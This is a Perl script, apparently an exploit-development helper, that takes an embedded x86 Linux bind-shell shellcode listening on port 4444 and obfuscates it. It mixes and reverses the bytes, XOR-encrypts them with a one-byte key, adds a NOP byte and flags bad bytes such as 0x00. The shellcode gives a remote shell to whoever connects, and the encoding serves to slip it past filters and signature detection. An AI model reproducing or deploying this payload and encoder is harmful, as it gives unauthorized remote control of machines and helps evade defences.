#!/usr/bin/perl
print "#############################################################################\n";
print "This tool will read the bytecode, replace the values starting from the edges.\n";
print "It will also add a nop sled to the end if the number of bytes is odd.\n";
print "e.g: code: ABCDE -> ABCDE0 -> 0EDCBA\n";
print "#############################################################################\n";

#bind shellcode on 4444
$code="\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x31\xd2\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x53\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x59\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

#test
#$code="\x41\x42\x43\x44"; #ABCD->DCBA

$secret="\x26"; #code to use as hexa encryption key
$issue=0;
$issue2=0;
#put the hex representation in $codeh
$codeh=unpack("H*",$code);
$codelen=length($code);
print "[+] Hexa code:\n".$codeh."\n";
print "Hexa length    : ".$codelen."\n";

#print out the code using /x
$hexor_print="";
for ($i1=0;$i1<$codelen;$i1++)
{
	$encoded=unpack("H*",substr($code,$i1,1));
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue="[!] WARNING: code contains \"0x00\"...likely cannot be executed as shellcode...do something!!!";print $issue."\n";exit(1);};
	if ($encoded eq "bb") {$issue="[!] WARNING: code contains \"0xbb\"...likely cannot be executed as shellcode...do something!!!";print $issue."\n";exit(1);};
}
print "\n[+] Original shellcode:\n".$hexor_print."\n";

print "___________________________________\n";

#put the hex representation in $secreth
$secreth=unpack("H*",$secret);
$secretlen=length($secret);
print "Secret         : 0x".$secreth."\n";
print "Secret lenght  : ".$secretlen."\n";
print "___________________________________\n";
#determine if length of code can be divided by 2 or nor
#if not, r1 will be <>0
$len1=$codelen / 2;
$rem1=$codelen % 2;

#if length is not dividable by 2, we will add a nop sled at the end
print "Old Length : ".$codelen."\n";
print "Divided    : ".$len1."\n";
print "Remainder  : ".$rem1."\n";

if ($rem1 ne 0) {$codeh=$codeh."90"};
$code=pack("H*",$codeh);
$codelen=length($code);
print "New Length : ".$codelen."\n";
print "Added $rem1 nop: 0x90\n";
print "[+] Extended:\n".$codeh."\n";
print "___________________________________\n";

print "\n";
$newcode="";
#do the mixing and reversing of chars. 
#mixing: read first,last, put them beside each other. Result e.g: code: ABCDE0 -> 0AEBDC
#reversing: read first, last and exchange them. Result e.g.: ABCDE0 -> 0EDCBA
#print "Changes:\n";
@codearray[$codelen];
for ($i1=0;$i1<$len1;$i1++)
{
	$first=substr($codeh,$i1*2,2);
	$last=substr($codeh,($codelen-1-$i1)*2,2);
	$newcode=$newcode.$last.$first; #mixing
	@codearray[$i1]=$last; #revesing 1
	@codearray[$codelen-1-$i1]=$first; #reversing 2
#	print $i1.":".$first." <-> ".($codelen-1-$i1).":".$last."\n";
}
#print out the code as raw hexa
print "[+] Raw crazymixed code:\n".$newcode."\n";

#print out the code using /x
$hexor_print="";
$issue=0;
for ($i1=0;$i1<$codelen;$i1++)
{
	$encoded=substr($newcode,$i1*2,2);
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue=1;$issue2=1;};
	if ($encoded eq "bb") {$issue=2;$issue2=1;};
	if ($encoded eq "61") {$issue=3;$issue2=1;};
	if ($encoded eq "a0") {$issue=4;$issue2=1;};
	if ($encoded eq "c6") {$issue=5;$issue2=1;};
}
if ($issue eq "1") {print "[!] WARNING: MIXED code contains \"0x00\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "2") {print "[!] WARNING: MIXED code contains \"0xbb\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "3") {print "[!] WARNING: MIXED code contains \"0x61\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "4") {print "[!] WARNING: MIXED code contains \"0xa0\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "5") {print "[!] WARNING: MIXED code contains \"0xc6\"...likely cannot be executed as shellcode...do something!!!\n";}

print "\n[+] Crazymixed shellcode:\n".$hexor_print."\n";
print "\nCodelength: $codelen\n\n";

#encrypt using XOR
$hexor_print="";
$hexor="";
$issue=0;
for ($i=0;$i<$codelen;$i++)
{
	$encoded=unpack('H*',substr($code,$i,1)^$secret);	
	$hexor=$hexor.$encoded;
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue=1;$issue2=1;};
	if ($encoded eq "bb") {$issue=2;$issue2=1;};
	if ($encoded eq "61") {$issue=3;$issue2=1;};
	if ($encoded eq "a0") {$issue=4;$issue2=1;};
	if ($encoded eq "c6") {$issue=5;$issue2=1;};
}
if ($issue eq "1") {print "[!] WARNING: XOR code contains \"0x00\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "2") {print "[!] WARNING: XOR code contains \"0xbb\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "3") {print "[!] WARNING: XOR code contains \"0x61\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "4") {print "[!] WARNING: XOR code contains \"0xa0\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "5") {print "[!] WARNING: XOR code contains \"0xc6\"...likely cannot be executed as shellcode...do something!!!\n";}

print "[+] XOR encrypted crazymixed raw:\n".$hexor."\n";
print "\n[+] XOR encrypted crazymixed shellcode\n".$hexor_print."\n";
print "\nCodelength: $codelen\n\n";


print "[+] Reversed code:\n";
foreach $i (@codearray)
{
	print $i;
}
print "\n";

print "\n[+] Reversed shellcode:\n";
$codelen1=0;
foreach $i (@codearray)
{
	$codelen1++;
	print ",0x".$i;
}
print "\n";
print "\nCodelength: $codelen1\n\n";


#encrypt using XOR
print "\n";
$hexor_print="";
$hexor="";
$codelen1=0;
$issue=0;
foreach $x1 (@codearray)
{
		$codelen1++;
		$encoded=unpack("H*",pack("H*",$x1)^$secret);
		$hexor=$hexor.$encoded;
		$hexor_print=$hexor_print.",0x".$encoded;
		if ($encoded eq "00") {$issue=1;$issue2=1;};
		if ($encoded eq "bb") {$issue=2;$issue2=1;};
		if ($encoded eq "61") {$issue=3;$issue2=1;};
		if ($encoded eq "a0") {$issue=4;$issue2=1;};
		if ($encoded eq "c6") {$issue=5;$issue2=1;};
}
if ($issue eq "1") {print "[!] WARNING: XOR code contains \"0x00\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "2") {print "[!] WARNING: XOR code contains \"0xbb\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "3") {print "[!] WARNING: XOR code contains \"0x61\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "4") {print "[!] WARNING: XOR code contains \"0xa0\"...likely cannot be executed as shellcode...do something!!!\n";}
if ($issue eq "5") {print "[!] WARNING: XOR code contains \"0xc6\"...likely cannot be executed as shellcode...do something!!!\n";}

print "[+] XOR encrypted reversed raw:\n".$hexor."\n";
print "\n[+] XOR encrypted reversed shellcode\n".$hexor_print."\n";
print "\nCodelength: ".$codelen1."\n\n";


print "#############################################################################\n";
if ($issue ne "0") {print "\n[!] Exit: Issues were found, check above!\n";}
else {print "\n[+] Exit: No issues!\n";}
print "Issue: $issue";


exit(1);

## convert each character from the string into HEX code
#$string =~ s/(.)/sprintf("%X",ord($1))/eg;
#print "Hex: $string\n";

#$x1=unpack("H*",$string);
#print "Pack H:".$x1."\n";

#$x2=pack("H*",$x1);
#print "Pack C:".$x2."\n";


## convert each two digit into char code
#$string =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;
#print "Char: $string\n";

